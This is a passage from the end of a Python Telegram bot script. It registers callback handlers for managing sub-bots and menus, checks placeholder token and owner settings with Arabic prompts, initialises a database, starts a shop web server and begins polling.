    app.add_handler(CallbackQueryHandler(cb_bot_del, pattern=r"^bot:del:\d+$"))
    app.add_handler(CallbackQueryHandler(cb_bot_stats, pattern=r"^bot:stats:\d+$"))

    # Main
    app.add_handler(CallbackQueryHandler(cb_main, pattern=r"^menu:main$"))
    app.add_handler(CallbackQueryHandler(cb_mybots, pattern=r"^menu:mybots$"))
    app.add_handler(CallbackQueryHandler(cb_help, pattern=r"^menu:help$"))

    return app


def main():
    if not MAIN_BOT_TOKEN or MAIN_BOT_TOKEN == "PUT_MAIN_BOT_TOKEN_HERE":
        print("❌ ضع MAIN_BOT_TOKEN"); return
    if not OWNER_ID or OWNER_ID == 0:
        print("❌ ضع OWNER_ID"); return

    init_db()
    logger.info("📦 Database ready")

    start_web_server()
    logger.info(f"🌐 Shop URL: {PUBLIC_URL}")

    app = build_app()
    logger.info("🤖 Main bot starting...")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
